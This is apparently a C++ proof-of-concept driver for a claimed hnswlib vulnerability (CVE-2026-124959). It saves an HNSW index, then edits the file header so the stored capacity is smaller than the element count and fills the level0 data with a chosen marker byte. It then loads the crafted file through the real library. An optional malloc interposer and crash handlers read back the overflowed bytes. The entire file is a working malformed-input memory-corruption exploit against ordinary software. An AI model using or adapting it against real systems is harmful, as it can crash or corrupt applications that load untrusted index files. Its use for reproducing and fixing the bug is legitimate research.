/*
 * hnswlib CVE-2026-124959 extracted driver. Calls the real pinned
 * HierarchicalNSW load path. No library source is copied or patched; the
 * optional allocator interposer only relocates the library's real level0
 * buffer into page-aligned readable memory for chosen-byte readback.
 */
#include "hnswlib/hnswalg.h"
#include "hnswlib/space_l2.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>
#include <csignal>
#include <unistd.h>

#ifdef ALLOC_INTERPOSER
#include <sys/mman.h>
extern "C" void *__real_malloc(size_t);
extern "C" void __real_free(void *);
static size_t stage_size = 0;
static void *staged = nullptr;
extern "C" void *__wrap_malloc(size_t s) {
  if (stage_size && s == stage_size && staged == nullptr) {
    void *p = mmap(nullptr, 1024 * 1024, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p != MAP_FAILED) { staged = p; return p; }
  }
  return __real_malloc(s);
}
extern "C" void __wrap_free(void *p) {
  if (p == staged) return;
  __real_free(p);
}
#endif

static void dump_staged(const char *tag) {
#ifdef ALLOC_INTERPOSER
  if (staged == nullptr) return;
  static const size_t offs[] = {0, 32, 64, 128, 256, 512, 1024, 4096};
  for (size_t i = 0; i < sizeof(offs) / sizeof(offs[0]); i++)
    printf("+%zu=%02x", offs[i], ((unsigned char *)staged)[offs[i]]);
  printf(" tag=%s\n", tag);
  fflush(stdout);
#else
  (void)tag;
#endif
}

static void crash_handler(int sig) {
  dump_staged("signal");
  _exit(0);
}

int main(int argc, char **argv) {
  if (argc < 3) { fprintf(stderr, "usage: driver MODE PATH\n"); return 2; }
  const std::string mode = argv[1];
  const std::string path = argv[2];
  const int dim = 21, n = 512, links = 4;

  if (mode == "save") {
    unsigned char marker =
        (unsigned char)(argc > 3 ? strtoul(argv[3], NULL, 16) : 0x5a);
    hnswlib::L2Space space(dim);
    hnswlib::HierarchicalNSW<float> idx(&space, n, links, 100);
    for (int i = 0; i < n; i++) {
      float v[dim];
      for (int d = 0; d < dim; d++) v[d] = (float)i;
      idx.addPoint(v, (size_t)i);
    }
    idx.saveIndex(path);
    /* Header: offsetLevel0_(8), max_elements_(8), cur_element_count(8),
     * size_data_per_element_(8), label_offset_(8), offsetData_(8), maxlevel(4),
     * enterpoint(4), maxM_(8), maxM0_(8), M_(8), mult_(8), ef_(8) = 96 bytes.
     * Shrink only the stored capacity; fill the level0 image with the chosen
     * marker so the copied bytes are unambiguous. */
    std::fstream f(path, std::ios::in | std::ios::out | std::ios::binary);
    size_t cap = 2, count = 0, per = 0;
    f.seekg(16); f.read((char *)&count, sizeof(count));
    f.read((char *)&per, sizeof(per));
    cap = 2;
    f.seekp(8); f.write((const char *)&cap, sizeof(cap));
    std::string payload((size_t)count * per, (char)marker);
    f.seekp(96);
    f.write(payload.data(), (std::streamsize)payload.size());
    f.close();
    printf("mode=save n=%d dim=%d stored_capacity=2 count=%zu per=%zu value=%02x\n",
           n, dim, count, per, marker);
    return 0;
  }

#ifdef ALLOC_INTERPOSER
  {
    std::ifstream f(path, std::ios::binary);
    size_t hdr[4] = {0, 0, 0, 0};
    f.read((char *)hdr, sizeof(hdr));
    stage_size = hdr[1] * hdr[3];
    printf("stage_size=%zu count=%zu\n", stage_size, hdr[2]);
  }
  signal(SIGSEGV, crash_handler);
  signal(SIGABRT, crash_handler);
#else
  signal(SIGPIPE, SIG_IGN);
#endif

  hnswlib::L2Space space(dim);
  try {
    hnswlib::HierarchicalNSW<float> idx(&space, path);
    printf("mode=%s rv=loaded\n", mode.c_str());
    dump_staged("loaded");
  } catch (const std::exception &e) {
    printf("mode=%s rv=exception what=%s\n", mode.c_str(), e.what());
    dump_staged("exception");
  }
  return 0;
}
